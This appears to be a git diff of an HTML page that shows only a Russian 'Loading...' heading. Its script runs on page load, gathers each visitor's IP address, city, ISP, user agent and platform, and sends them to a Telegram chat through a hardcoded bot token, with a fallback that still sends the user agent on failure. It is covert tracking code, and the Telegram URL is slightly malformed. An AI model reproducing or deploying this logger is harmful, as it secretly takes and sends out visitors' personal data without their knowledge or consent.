@@ -2,27 +2,29 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v19.0)</h1>
+    <h1 id="status">Загрузка... (v20.0)</h1>
     <script>
-        async function run() {
+        async function start() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8242133853";
             const status = document.getElementById('status');
+
             try {
-                const res = await fetch('https://ipwho.is');
+                const res = await fetch('https://ipapi.co');
                 const d = await res.json();
                 
-                const msg = `🚀 ЛОГ!\nIP: ${d.ip}\nГород: ${d.city}\nПровайдер: ${d.connection.org}\n📱 Устройство: ${navigator.userAgent}`;
-                
+                const msg = `🚀 ЛОГ!\nIP: ${d.ip}\nГород: ${d.city}\n📱 Устройство: ${navigator.userAgent}\n💻 ОС: ${navigator.platform}`;
+
                 await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                
                 status.innerText = "ГОТОВО!";
             } catch (e) {
-                const backup = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
-                status.innerText = "Лог ушел (без IP).";
+                const errText = `⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`;
+                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(errText)}`);
+                status.innerText = "Готово (лог ушел)!";
             }
         }
-        run();
+        start();
     </script>
 </body>
 </html>
